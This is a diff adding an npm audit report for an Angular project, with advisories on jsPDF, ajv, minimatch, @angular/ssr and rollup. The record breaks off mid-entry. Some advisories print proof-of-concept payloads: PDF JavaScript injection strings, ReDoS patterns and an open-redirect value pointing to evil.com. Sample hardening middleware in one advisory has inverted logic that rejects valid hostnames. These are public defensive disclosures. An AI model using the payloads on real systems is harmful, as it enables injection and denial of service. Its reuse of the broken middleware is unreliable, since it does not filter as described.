@@ -1,0 +1,580 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113515,
+          "path": ".>@angular-devkit/build-angular>@angular/build>vite>rollup",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "rollup",
+      "target": "4.59.0",
+      "depth": 5
+    },
+    {
+      "action": "review",
+      "module": "jspdf",
+      "resolves": [
+        {
+          "id": 1113309,
+          "path": ".>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113310,
+          "path": ".>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113324,
+          "path": ".>jspdf",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ajv",
+      "resolves": [
+        {
+          "id": 1113428,
+          "path": ".>eslint>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113429,
+          "path": ".>@angular-devkit/build-angular>@angular-devkit/core>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1113459,
+          "path": ".>eslint>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113461,
+          "path": ".>source-map-explorer>ejs>jake>filelist>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113465,
+          "path": ".>@angular/cli>pacote>@npmcli/package-json>glob>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@angular/ssr",
+      "resolves": [
+        {
+          "id": 1113507,
+          "path": ".>@angular/ssr",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113511,
+          "path": ".>@angular/ssr",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "rollup",
+      "resolves": [
+        {
+          "id": 1113515,
+          "path": ".>@angular-devkit/build-angular>@angular/build>rollup",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1113309": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            ".>jspdf"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-p5xg-68wr-hm3m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25940\n- https://github.com/parallax/jsPDF/commit/71ad2dbfa6c7c189ab42b855b782620fa8a38375\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://github.com/advisories/GHSA-p5xg-68wr-hm3m",
+      "created": "2026-02-19T19:32:48.000Z",
+      "id": 1113309,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of properties and methods of the Acroform module allows users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the possibility to pass unsanitized input to one of the following property, a user can inject arbitrary PDF objects, such as JavaScript actions, which are executed when the victim hovers over the radio option.\n\n* `AcroformChildClass.appearanceState`\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\nconst doc = new jsPDF();\n\nconst group = new doc.AcroFormRadioButton();\ngroup.x = 10; group.y = 10; group.width = 20; group.height = 10;\ndoc.addField(group);\n\nconst child = group.createOption(\"opt1\");\nchild.x = 10; child.y = 10; child.width = 20; child.height = 10;\nchild.appearanceState = \"Off /AA << /E << /S /JavaScript /JS (app.alert('XSS')) >> >>\";\n\ndoc.save(\"test.pdf\");\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.2.0.\n\n### Workarounds\nSanitize user input before passing it to the vulnerable API members.",
+      "reported_by": null,
+      "title": "jsPDF has a PDF Injection in AcroForm module allows Arbitrary JavaScript Execution (RadioButton.createOption and \"AS\" property)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25940"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-p5xg-68wr-hm3m",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-02-19T19:32:48.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-p5xg-68wr-hm3m"
+    },
+    "1113310": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            ".>jspdf"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-9vjf-qc39-jprp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25755\n- https://github.com/parallax/jsPDF/commit/56b46d45b052346f5995b005a34af5dcdddd5437\n- https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://github.com/advisories/GHSA-9vjf-qc39-jprp",
+      "created": "2026-02-19T19:32:36.000Z",
+      "id": 1113310,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the argument of the `addJS` method allows an attacker to inject arbitrary PDF objects into the generated document. By crafting a payload that escapes the JavaScript string delimiter, an attacker can execute malicious actions or alter the document structure, impacting any user who opens the generated PDF.\n\n```js\nimport { jsPDF } from \"jspdf\";\nconst doc = new jsPDF();\n// Payload:\n// 1. ) closes the JS string.\n// 2. > closes the current dictionary.\n// 3. /AA ... injects an \"Additional Action\" that executes on focus/open.\nconst maliciousPayload = \"console.log('test');) >> /AA << /O << /S /JavaScript /JS (app.alert('Hacked!')) >> >>\";\n\ndoc.addJS(maliciousPayload);\ndoc.save(\"vulnerable.pdf\");\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.2.0.\n\n### Workarounds\nEscape parentheses in user-provided JavaScript code before passing them to the `addJS` method.\n### References\nhttps://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md",
+      "reported_by": null,
+      "title": "jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25755"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-9vjf-qc39-jprp",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-02-19T19:32:37.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-9vjf-qc39-jprp"
+    },
+    "1113324": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            ".>jspdf"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-67pg-wm7f-q7fj\n- https://github.com/parallax/jsPDF/commit/2e5e156e284d92c7d134bce97e6418756941d5e6\n- https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25535.md\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25535\n- https://github.com/advisories/GHSA-67pg-wm7f-q7fj",
+      "created": "2026-02-19T15:25:48.000Z",
+      "id": 1113324,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the first argument of the `addImage` method results in denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the `addImage` method, a user can provide a harmful GIF file that results in out of memory errors and denial of service. Harmful GIF files have large width and/or height entries in their headers, wich lead to excessive memory allocation.\n\nOther affected methods are: `html`.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\n// malicious GIF image data with large width/height headers\nconst payload = ...\n\nconst doc = new jsPDF();\n\ndoc.addImage(payload, \"GIF\", 0, 0, 100, 100);\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF 4.1.1. Upgrade to jspdf@>=4.2.0.\n\n### Workarounds\n\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.\n### References\nhttps://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25535.md",
+      "reported_by": null,
+      "title": "jsPDF Affected by Client-Side/Server-Side Denial of Service via Malicious GIF Dimensions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25535"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-67pg-wm7f-q7fj",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-02-19T20:58:09.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-67pg-wm7f-q7fj"
+    },
+    "1113428": {
+      "findings": [
+        {
+          "version": "6.12.6",
+          "paths": [
+            ".>eslint>ajv"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113428,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": "<6.14.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 6.14.0 or later",
+      "patched_versions": ">=6.14.0",
+      "updated": "2026-02-23T22:40:32.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1113429": {
+      "findings": [
+        {
+          "version": "8.17.1",
+          "paths": [
+            ".>@angular-devkit/build-angular>@angular-devkit/core>ajv"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113429,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": ">=7.0.0-alpha.0 <8.18.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 8.18.0 or later",
+      "patched_versions": ">=8.18.0",
+      "updated": "2026-02-23T22:40:32.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1113459": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            ".>eslint>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113459,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.3",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113461": {
+      "findings": [
+        {
+          "version": "5.1.6",
+          "paths": [
+            ".>source-map-explorer>ejs>jake>filelist>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113461,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=5.0.0 <5.1.7",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 5.1.7 or later",
+      "patched_versions": ">=5.1.7",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113465": {
+      "findings": [
+        {
+          "version": "9.0.5",
+          "paths": [
+            ".>@angular/cli>pacote>@npmcli/package-json>glob>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113465,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=9.0.0 <9.0.6",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 9.0.6 or later",
+      "patched_versions": ">=9.0.6",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113507": {
+      "findings": [
+        {
+          "version": "19.2.19",
+          "paths": [
+            ".>@angular/ssr"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/angular/angular-cli/security/advisories/GHSA-x288-3778-4hhx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27739\n- https://github.com/angular/angular-cli/pull/32516\n- https://angular.dev/best-practices/security#preventing-server-side-request-forgery-ssrf\n- https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF\n- https://github.com/advisories/GHSA-x288-3778-4hhx",
+      "created": "2026-02-25T22:42:36.000Z",
+      "id": 1113507,
+      "npm_advisory_id": null,
+      "overview": "A [Server-Side Request Forgery (SSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF) vulnerability has been identified in the Angular SSR request handling pipeline. The vulnerability exists because Angular’s internal URL reconstruction logic directly trusts and consumes user-controlled HTTP headers specifically the Host and `X-Forwarded-*` family to determine the application's base origin without any validation of the destination domain.\n\nSpecifically, the framework didn't have checks for the following:\n- **Host Domain**: The `Host` and `X-Forwarded-Host` headers were not checked to belong to a trusted origin. This allows an attacker to redefine the \"base\" of the application to an arbitrary external domain.\n- **Path & Character Sanitization**: The `X-Forwarded-Host` header was not checked for path segments or special characters, allowing manipulation of the base path for all resolved relative URLs.\n- **Port Validation**: The `X-Forwarded-Port` header was not verified as numeric, leading to malformed URI construction or injection attacks.\n\n\nThis vulnerability manifests in two primary ways:\n\n- **Implicit Relative URL Resolution**: Angular's `HttpClient` resolves relative URLs against this unvalidated and potentially malformed base origin. An attacker can \"steer\" these requests to an external server or internal service.\n- **Explicit Manual Construction**: Developers injecting the `REQUEST` object to manually construct URLs (for fetch or third-party SDKs) directly inherit these unsanitized values. By accessing the `Host` / `X-Forwarded-*` headers, the application logic may perform requests to attacker-controlled destinations or malformed endpoints.\n\n### Impact\n\nWhen successfully exploited, this vulnerability allows for arbitrary internal request steering. This can lead to:\n- **Credential Exfiltration**: Stealing sensitive `Authorization` headers or session cookies by redirecting them to an attacker's server.\n- **Internal Network Probing**: Accessing and transmitting data from internal services, databases, or cloud metadata endpoints (e.g., `169.254.169.254`) not exposed to the public internet.\n- Confidentiality Breach: Accessing sensitive information processed within the application's server-side context.\n\n### Attack Preconditions\n\n- The victim application must use Angular SSR (Server-Side Rendering).\n- The application must perform `HttpClient` requests using relative URLs OR manually construct URLs using the unvalidated `Host` / `X-Forwarded-*` headers using the `REQUEST` object.\n- **Direct Header Access**: The application server is reachable by an attacker who can influence these headers without strict validation from a front-facing proxy.\n- **Lack of Upstream Validation**: The infrastructure (Cloud, CDN, or Load Balancer) does not sanitize or validate incoming headers.\n\n### Patches\n\n- 21.2.0-rc.1\n- 21.1.5\n- 20.3.17\n- 19.2.21\n\n\n### Workarounds\n- **Use Absolute URLs:** Avoid using `req.headers` for URL construction. Instead, use trusted variables for your base API paths.\n- **Implement Strict Header Validation (Middleware)**: If you cannot upgrade immediately, implement a middleware in your `server.ts` to enforce numeric ports and validated hostnames.\n\n```ts\nconst ALLOWED_HOSTS = new Set(['your-domain.com']);\n\napp.use((req, res, next) => {\n  const hostHeader = (req.headers['x-forwarded-host'] ?? req.headers['host'])?.toString();\n  const portHeader = req.headers['x-forwarded-port']?.toString();\n\n  if (hostHeader) {\n    const hostname = hostHeader.split(':')[0];\n    // Reject if hostname contains path separators or is not in allowlist\n    if (/^[a-z0-9.:-]+$/i.test(hostname) || \n       (!ALLOWED_HOSTS.has(hostname) && hostname !== 'localhost')) {\n      return res.status(400).send('Invalid Hostname');\n    }\n  }\n\n  // Ensure port is strictly numeric if provided\n  if (portHeader && !/^\\d+$/.test(portHeader)) {\n    return res.status(400).send('Invalid Port');\n  }\n\n  next();\n});\n```\n\n### References\n\n- [Fix](https://github.com/angular/angular-cli/pull/32516)\n- [Docs](https://angular.dev/best-practices/security#preventing-server-side-request-forgery-ssrf)",
+      "reported_by": null,
+      "title": "Angular SSR is vulnerable to SSRF and Header Injection via request handling pipeline",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27739"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "@angular/ssr",
+      "vulnerable_versions": "<19.2.21",
+      "github_advisory_id": "GHSA-x288-3778-4hhx",
+      "recommendation": "Upgrade to version 19.2.21 or later",
+      "patched_versions": ">=19.2.21",
+      "updated": "2026-02-25T22:42:37.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-x288-3778-4hhx"
+    },
+    "1113511": {
+      "findings": [
+        {
+          "version": "19.2.19",
+          "paths": [
+            ".>@angular/ssr"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/angular/angular-cli/security/advisories/GHSA-xh43-g2fq-wjrj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27738\n- https://github.com/angular/angular-cli/issues/32501\n- https://github.com/angular/angular-cli/pull/32521\n- https://github.com/angular/angular-cli/commit/f086eccc36d10cf01c426e35864bc32e1e292323\n- https://github.com/advisories/GHSA-xh43-g2fq-wjrj",
+      "created": "2026-02-25T22:41:57.000Z",
+      "id": 1113511,
+      "npm_advisory_id": null,
+      "overview": "An Open Redirect vulnerability exists in the internal URL processing logic in Angular SSR. The logic normalizes URL segments by stripping leading slashes; however, it only removes a single leading slash.\n\nWhen an Angular SSR application is deployed behind a proxy that passes the `X-Forwarded-Prefix` header, an attacker can provide a value starting with three slashes (e.g., `///evil.com`).\n\n1. The application processes a redirect (e.g., from a router `redirectTo` or i18n locale switch).\n2. Angular receives `///evil.com` as the prefix.\n3. It strips one slash, leaving `//evil.com`.\n4. The resulting string is used in the `Location` header.\n5. Modern browsers interpret `//` as a protocol-relative URL, redirecting the user from `https://your-app.com` to `https://evil.com`.\n\n\n### Impact\nThis vulnerability allows attackers to conduct large-scale phishing and SEO hijacking:\n- **Scale:** A single request can poison a high-traffic route, impacting all users until the cache expires.\n- **SEO Poisoning:** Search engine crawlers may follow and index these malicious redirects, causing the legitimate site to be delisted or associated with malicious domains.\n- **Trust:** Because the initial URL belongs to the trusted domain, users and security tools are less likely to flag the redirect as malicious.\n\n### Attack Preconditions\n\n- The application must use Angular SSR.\n- The application must have routes that perform internal redirects.\n- The infrastructure (Reverse Proxy/CDN) must pass the `X-Forwarded-Prefix` header to the SSR process without sanitization.\n- The cache must not vary on the `X-Forwarded-Prefix` header.\n\n### Patches\n- 21.2.0-rc.1\n- 21.1.5\n- 20.3.17\n- 19.2.21\n\n### Workarounds\nUntil the patch is applied, developers should sanitize the `X-Forwarded-Prefix` header in their`server.ts` before the Angular engine processes the request:\n\n```ts\napp.use((req, res, next) => {\n  const prefix = req.headers['x-forwarded-prefix']?.trim();\n  if (prefix) {\n    // Sanitize by removing all leading slashes\n    req.headers['x-forwarded-prefix'] = prefix.replace(/^[/\\\\]+/, '/');\n  }\n  next();\n});\n\n```\n\n### Resources\n- [Report](https://github.com/angular/angular-cli/issues/32501)\n- [Fix](https://github.com/angular/angular-cli/pull/32521)",
+      "reported_by": null,
+      "title": "Angular SSR has an Open Redirect via X-Forwarded-Prefix",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27738"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@angular/ssr",
+      "vulnerable_versions": ">=19.0.0-next.0 <19.2.21",
+      "github_advisory_id": "GHSA-xh43-g2fq-wjrj",
+      "recommendation": "Upgrade to version 19.2.21 or later",
+      "patched_versions": ">=19.2.21",
+      "updated": "2026-02-25T22:41:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-xh43-g2fq-wjrj"
+    },
+    "1113515": {
+      "findings": [
+        {
+          "version": "4.34.8",
+          "paths": [
+            ".>@angular-devkit/build-angular>@angular/build>rollup"
+          ]
+        },
+        {
+          "version": "4.55.2",
+          "paths": [
+            ".>@angular-devkit/build-angular>@angular/build>vite>rollup"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
